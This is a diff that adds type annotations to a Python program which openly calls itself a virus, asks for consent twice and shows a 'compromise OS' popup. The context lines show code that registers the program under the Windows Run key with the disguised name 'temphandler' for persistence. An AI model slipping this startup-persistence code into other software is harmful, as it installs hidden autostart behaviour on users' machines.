@@ -5,8 +5,10 @@ from tqdm import tqdm
 from tkinter import messagebox
 import winreg as reg
 
+# pyright: reportUnknownMemberType=false
+
 # Add the program to Windows startup
-def add_to_startup(file_path, app_name="temphandler"):
+def add_to_startup(file_path: str, app_name: str ="temphandler"):
     try:
         # Open the registry key for current user's startup programs
         key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
@@ -14,7 +16,7 @@ def add_to_startup(file_path, app_name="temphandler"):
         reg.SetValueEx(key, app_name, 0, reg.REG_SZ, file_path)
         reg.CloseKey(key)
     except Exception as e:
-        messagebox.showerror(title="Error", message=e)
+        messagebox.showerror(title="Error", message=f"{e}")
 
 # Determine the source file path
 if getattr(sys, 'frozen', False):
@@ -48,7 +50,7 @@ messagebox.showwarning(title='WARNING!', message='This program contains flashing
 if messagebox.askyesno(title='DANGER!', message='Are you sure you want to run this virus?', icon='error'):
     if messagebox.askokcancel(title='Your last chance!', message='This is your last chance!\nAre you sure you want to run this virus?', icon='error'):
         
-        def show_loading_popup(title="System", message="Preparing to compromise OS:"):
+        def show_loading_popup(title: str ="System", message: str ="Preparing to compromise OS:"):
             popup = tk.Toplevel()
             popup.title(title)
             popup.geometry("400x120")
